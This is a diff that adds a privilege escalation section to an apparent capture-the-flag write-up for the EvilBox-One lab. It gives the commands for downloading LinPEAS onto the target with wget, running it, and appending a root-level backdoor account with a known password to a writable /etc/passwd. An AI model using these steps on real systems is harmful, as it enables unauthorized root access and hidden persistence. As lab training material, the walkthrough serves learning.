@@ -102,3 +102,44 @@
     * There is a flag file in mowree's home directory  
     ![Mowree-flag](./img/evilbox-server13.png)  
 
+## Privilege Escalation  
+1. Copy the LinPEAS shell  
+    * Open a new terminal  
+    * `cp ~/linpeas.sh ./`  
+
+1. Start a simple HTTP server with python  
+    * `python3 -m http.server 8080`  
+
+1. Down load the linpeas.sh file from the HTTP server  
+    * Execute "wget" command from the EvilBoxOne server  
+    ![Wget-linpeash](./img/evilbox-server14.png)  
+        - `wget http://192.168.56.101:8080/linpeas.sh`  
+
+1. Execute the pinpeash.sh file  
+    * Allocate an executable permission to the linpeash.sh file and execute it  
+    ![Output-linpeas](./img/evilbox-server15.png)  
+        - `chmod +x linpeas.sh`  
+        - `./linpeas.sh > output.txt`  
+        - `more output.txt`  
+        - We found "**/etc/passwd is writable**"  
+
+1. Add a backdoor account in /etc/passwd  
+    * Make a backup of /etc/passwd  
+        - `cp /etc/passwd ./`  
+    * Make a password using openssl  
+        - `openssl passwd -1 -salt usersalt`  
+        - Password: pass  
+    * Add an eviluser in the /etc/passwd as a root  
+        - `echo 'eviluser2:$1$usersalt$AdRPkkbvjFipmAjyOm.NT/:0:0:root:/root:/bin/bash' >> /etc/passwd`  
+
+1. Change the backdoor account  
+    * Change to the eviluser  
+    ![Eviluser2](./img/evilbox-server16.png)  
+        - `su eviluser2`
+        - Password: pass  
+        - We can see the root prompt  
+
+## Credential Access for root user  
+1. Open the root flag file  
+    * Open the root.txt  
+    ![Root-flag](./img/evilbox-server17.png)  
